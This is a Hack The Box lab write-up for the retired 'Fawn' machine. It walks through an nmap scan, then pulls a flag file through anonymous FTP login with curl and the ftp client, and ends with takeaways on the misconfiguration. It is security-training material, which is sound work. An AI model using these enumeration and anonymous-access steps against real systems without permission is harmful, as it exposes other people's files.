> **Disclaimer:** This writeup is published after the machine was retired from Hack The Box. All flags are unique per user.

# Fawn

**Hack The Box** · Very Easy · Linux

`FTP` · `Anonymous Login` · `Sensitive File Exposure`

---

## Overview

Fawn teaches FTP enumeration and the risk of anonymous access. The machine runs a single FTP service that allows unauthenticated login, exposing a flag file directly in the FTP root.

---

## Reconnaissance

```bash
nmap -sC -sV <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

One port: FTP on 21 running vsftpd 3.0.3. Nmap's `ftp-anon` script immediately flags that anonymous login is allowed and even lists the files — `flag.txt` is sitting right there in the FTP root.

---

## Grabbing the Flag via Anonymous FTP

Anonymous FTP means anyone can connect without credentials. The username is literally `anonymous` with any (or no) password.

```bash
curl ftp://anonymous:@<TARGET_IP>/flag.txt
```

One command, one file. The FTP server hands over the flag without any authentication.

Alternatively, you can use the interactive FTP client:

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: [blank]
ftp> ls
ftp> get flag.txt
```

---

## Takeaways

- Anonymous FTP is a common misconfiguration that can expose sensitive files. Always check for it during recon.
- Nmap's default scripts (`-sC`) include `ftp-anon`, which automatically detects anonymous access and lists visible files — no manual testing needed.
- `curl` can pull FTP files in a single command, which is faster than an interactive session for quick grabs.
